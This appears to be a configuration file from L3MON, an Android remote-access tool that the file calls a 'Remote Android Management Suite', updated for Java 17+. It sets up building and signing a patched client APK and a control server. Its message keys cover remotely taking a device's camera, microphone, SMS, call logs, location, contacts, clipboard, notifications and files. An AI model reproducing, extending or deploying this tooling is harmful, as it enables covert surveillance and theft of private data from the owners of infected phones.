/**
 * L3MON Configuration Constants
 * Updated for Java 17+ compatibility
 */

const path = require('path');

// Debug mode
exports.debug = process.env.DEBUG === 'true' || false;

// Server ports
exports.web_port = parseInt(process.env.WEB_PORT) || 22533;
exports.control_port = parseInt(process.env.CONTROL_PORT) || 22222;

// Java version requirements
exports.minJavaVersion = 17;

// Paths
exports.apkBuildPath = path.join(__dirname, '../assets/webpublic/build.apk');
exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/L3MON.apk');
exports.apkUnsignedPath = path.join(__dirname, '../assets/webpublic/build-unsigned.apk');

exports.downloadsFolder = '/client_downloads';
exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder);

exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
exports.apkSign = path.join(__dirname, '../app/factory/', 'sign.jar');
exports.keystore = path.join(__dirname, '../app/factory/', 'debug.keystore');
exports.keystorePass = 'android';
exports.keyAlias = 'androiddebugkey';
exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/etechd/l3mon/IOSocket.smali');

// Build commands with increased memory and Java 17+ compatibility
exports.buildCommand = `java -Xmx1024m -jar "${exports.apkTool}" b "${exports.smaliPath}" -o "${exports.apkBuildPath}" --use-aapt2`;
// Use jarsigner instead of the old sign.jar (compatible with Java 17+)
exports.signCommand = `jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore "${exports.keystore}" -storepass ${exports.keystorePass} -keypass ${exports.keystorePass} "${exports.apkBuildPath}" ${exports.keyAlias}`;

// Message keys for client communication
exports.messageKeys = {
    camera: '0xCA',
    files: '0xFI',
    call: '0xCL',
    sms: '0xSM',
    mic: '0xMI',
    location: '0xLO',
    contacts: '0xCO',
    wifi: '0xWI',
    notification: '0xNO',
    clipboard: '0xCB',
    installed: '0xIN',
    permissions: '0xPM',
    gotPermission: '0xGP'
};

// Log types with colors
exports.logTypes = {
    error: {
        name: 'ERROR',
        color: 'red'
    },
    alert: {
        name: 'ALERT',
        color: 'amber'
    },
    success: {
        name: 'SUCCESS',
        color: 'limegreen'
    },
    info: {
        name: 'INFO',
        color: 'blue'
    }
};

// Server info
exports.serverInfo = {
    name: 'L3MON',
    version: '2.0.0',
    description: 'Remote Android Management Suite'
};